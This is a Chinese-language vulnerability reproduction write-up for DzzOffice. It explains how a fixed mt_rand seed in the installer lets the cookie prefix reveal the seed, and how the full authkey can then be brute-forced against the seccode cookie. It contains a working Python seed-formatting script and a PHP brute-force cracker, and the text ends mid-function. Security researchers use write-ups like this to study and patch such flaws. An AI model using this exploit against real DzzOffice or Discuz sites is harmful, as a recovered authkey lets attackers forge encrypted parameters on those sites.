# 漏洞环境搭建
  * [源代码下载地址](https://github.com/zyx0814/dzzoffice/releases/)
  * 启动`LAMP`环境，将源码文件放入web目录下，访问浏览器访问web即可进入安装界面
  * 根据提示一直点击下一步即可，数据库信息如下
  * 管理员信息如下：
  * 提示如下信息，安装成功
  * 访问`admin.php?mod=setting&operation=sec`，检查验证码是否设置成功，这里一定要开启用户登录的验证码，不开启后续没有办法获取到想要的Cookie
# 漏洞原理分析
## random种子固定
漏洞产生的关键点在`install/index.php`，这个文件在完成安装之后会被自动删除，但是漏洞的作者，很细心的在这里发现了问题，这也提示我们不要忽略任何一个文件。
定位到相关代码片段
    $uid = 1 ;
            $authkey = substr(md5($_SERVER['SERVER_ADDR'].$_SERVER['HTTP_USER_AGENT'].$dbhost.$dbuser.$dbpw.$dbname.$pconnect.substr($timestamp, 0, 6)), 8, 6).random(10);
            $_config['db'][1]['dbhost'] = $dbhost;
            $_config['db'][1]['dbname'] = $dbname;
            $_config['db'][1]['dbpw'] = $dbpw;
            $_config['db'][1]['dbuser'] = $dbuser;
            $_config['db'][1]['port'] = $port?$port:'3306';
            $_config['db'][1]['tablepre'] = $tablepre;
            $_config['admincp']['founder'] = (string)$uid;
            $_config['security']['authkey'] = $authkey;
            $_config['cookie']['cookiepre'] = random(4).'_';
            $_config['memory']['prefix'] = random(6).'_';
这里的`authkey`和`Cookie`前缀都是调用`random()`函数生成了一部分
  * `authkey`：前6位是一堆变量md5后截取出来的，后十位是`random`函数生成的
  * `Cookie`：前四位是`random`的生成的
跟进`random()`，该函数位于`install/include/install_function.php`:
    function random($length) {
        $hash = '';
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
        $max = strlen($chars) - 1;
        PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
        for($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
        return $hash;
    }
这里的`random()`函数，跟修复随机数安全问题前的`Discuz`一模一样，没有重新播种，所有随机数都是通过同一个种子生成出来的
**一个小知识点：**
  * 在PHP4.2.0之前的版本,必须要通过`srand()`或`mt_srand()`给`rand()`或`mt_rand()`播种,
  * 在PHP4.2.0之后的版本,事先可以不再通过`srand()`或`mt_srand()`播种. 如直接调用`mt_rand()`,系统会自动播种.
    * 系统会自动播种,系统播种种子范围为0-2^32(32位系统),这样似乎也能枚举
  * `PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);` 这段代码是为了版本兼容写的
我们可以利用如下固定了种子的值得`Demo`做测试：
    function random($length) {
        $hash = '';
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
        $max = strlen($chars) - 1;
        PHP_VERSION < '4.2.0' && mt_srand(123456);
        mt_srand(123456);
        for($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
        return $hash;
    }
    echo random(10);
我们可以得出结论`在同一进程中,同一个seed,每次通过mt_rand()生成的值都是固定的`
## 通过Cookie获取种子
由于这里的Cookie前缀是我们可以获取到的，所以我们可以跑一遍PHP的所有的种子，得到11-14
位对应的随机数序列所对应的随机字符，判断是否为我们的Cookie前缀。这样就能获取所有随机可能的种子
再通过所有可能的随机数种子生成第1-10位对应的随机字符，这样就可以拿到`authkey[-10]`,至于前6位只能选择爆破
这样的话我们就能获得很多组可能的`authkey`
这样的话要解决两个问题：
  * `authkey`有什么作用
  * 如何验证`authkey`的正确性
## authkey的作用
这个系统大量套用`Discuz`的代码，因此`authkey`和`Discuz`里面的效果一样，在一种流算法`authcode()`中使用的key，来加密一些重要的参数。这也就意味着，只要能够拿到这个`authkey`我们就能，传入我们需要的参数。
## 验证authkey的正确性
通过全局搜索可以找到一处`authcode()`可控明文点，且加密之后的数据能够被获取到。文件`core/function/function_seccode.php`
代码片段如下：
    dsetcookie('seccode'.$idhash, authcode(strtoupper($seccode)."\t".(TIMESTAMP - 180)."\t".$idhash."\t".FORMHASH, 'ENCODE', $_G['config']['security']['authkey']), 0, 1, true);
这里设置了一个cookie，密文是用 `authkey`生成的，并且密文可以被得到，利用这里的cookie即可验证`authkey`的正确性。
## 完整爆破`authkey`流程
  1. 通过cookie前缀爆破随机数的seed，使用`php_mt_seed`工具。
  2. 用seed生成random(10)，得到所有可能的`authkey`后缀。
  3. 查看Cookie，获取`$idhash`，和对应的密文
  4. 用生成的后缀爆破前6位，范围是`0x000000-0xffffff`，解密密文观察是否正确
  5. 将计算出来的密文和获取的密文比较，相等即停止，获取当前的`authkey`。
# 漏洞利用验证
## 得到authkey
Cookie前缀我们很容易得到
利用如下脚本获得`php_mt_seed`可以处理格式的数据
    w_len = 10
    result = ""
    str_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
    length = len(str_list)
    for i in range(w_len):
        result += "0 "
        result += str(length-1)
        result += " "
        result += "0 "
        result += str(length - 1)
        result += " "
    sstr = "gGyk"
    for i in sstr:
        result += str(str_list.index(i))
        result += " "
        result += str(str_list.index(i))
        result += " "
        result += "0 "
        result += str(length - 1)
        result += " "
    print(result)
    result：0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 42 42 0 61 6 6 0 61 60 60 0 61 46 46 0 61
生成可能的种子文件：
使用如下脚本处理暴力爆破，验证idhash即可
    <?php
    $pre = 'gGyk';
    $seccode = substr('gGyk_2132_seccodeST09ZLe0', -8);
    $string = '2121YXrez2Rb_00AasW9CQZdtAIM2HTcnua-PmShhMGHLfrWTtXnAkbq42XcqrY94rVDphUTYWnaK9OX9m0';
    $seeds = explode("\n", file_get_contents('seed.txt'));
    for ($i = 0; $i < count($seeds); $i++) {
        if(preg_match('/= (\d+) /', $seeds[$i], $matach)) {
            mt_srand(intval($matach[1]));
            $authkey = random(10);
            echo $authkey;
            if(random(4) == $pre){
                echo "trying $authkey...\n";
                $res = crack($string, $authkey, $seccode);
                if($res) {
                    echo "authkey found: ".$res;
                    exit();
                }
            }
        }
    }
    function crack($string, $authkey, $seccode) {
        $chrs = '1234567890abcdef';
        for ($a = 0; $a < 16; $a++) {
            for ($b = 0; $b < 16; $b++) {
                for ($c = 0; $c < 16; $c++) {
                    for ($d = 0; $d < 16; $d++) {
                        for ($e = 0; $e < 16; $e++) {
                            for ($f = 0; $f < 16; $f++) {
                                $key = $chrs[$a].$chrs[$b].$chrs[$c].$chrs[$d].$chrs[$e].$chrs[$f].$authkey;
                                $result = authcode_decode($string, $key);
                                if (strpos($result, "\t$seccode\t")) {
                                    return $key;
                                }
                            }
                        }
                    }
                }
            }
        }